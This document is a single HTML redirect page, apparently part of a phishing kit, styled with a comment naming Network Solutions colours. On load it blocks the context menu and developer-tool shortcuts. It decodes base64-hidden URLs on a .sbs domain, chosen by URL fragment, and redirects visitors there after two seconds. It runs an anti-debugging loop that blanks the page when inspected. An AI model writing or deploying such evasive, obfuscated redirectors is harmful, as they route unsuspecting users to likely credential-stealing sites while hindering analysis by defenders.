<!-- language: HTML/CSS/JS, file: redirect.html, target: modern browsers -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Redirecting...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: #fafafa;
            -webkit-user-select: none;
            user-select: none;
        }

        /* Clean, simple green spinner */
        .loader {
            width: 48px;
            height: 48px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #1a6b5c; /* Network Solutions green */
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (prefers-reduced-motion: reduce) {
            .loader { animation: none; border-top-color: #e5e7eb; }
        }
    </style>
</head>
<body>
    
    <div class="loader"></div>

    <script type="text/javascript">
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.addEventListener('keydown', function(e) {
            if (e.keyCode === 123) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) { e.preventDefault(); return false; }
        });

        // Destination routing by fragment
        var ROUTES = {
            '1': 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9yc3ZwX21vdmVtZW50', // Default (Yours) 
            '2': 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9qdWxseTIzMi9tb250eXkzMw=='  // #2 (Someone else) ->
        };

        function pickDestination() {
            // Read the hash and strip the '#'
            var hash = window.location.hash.replace(/^#/, '');

            // If the hash is missing or doesn't exist in ROUTES, FORCE it to '1'
            if (!hash || !ROUTES[hash]) {
                hash = '1';
            }

            // Decode and return. If base64 is corrupted, fallback to '1'.
            try {
                return atob(ROUTES[hash]);
            } catch (err) {
                return atob(ROUTES['1']);
            }
        }

        var destination = pickDestination();

        setTimeout(function() {
            window.location.replace(destination);
        }, 2000);

        // Anti-debug loop
        setInterval(function() {
            var start = performance.now();
            debugger;
            var end = performance.now();
            if (end - start > 250 && document.visibilityState === 'visible') {
                window.location.replace('about:blank');
            }
        }, 2000);
    </script>
</body>
</html>
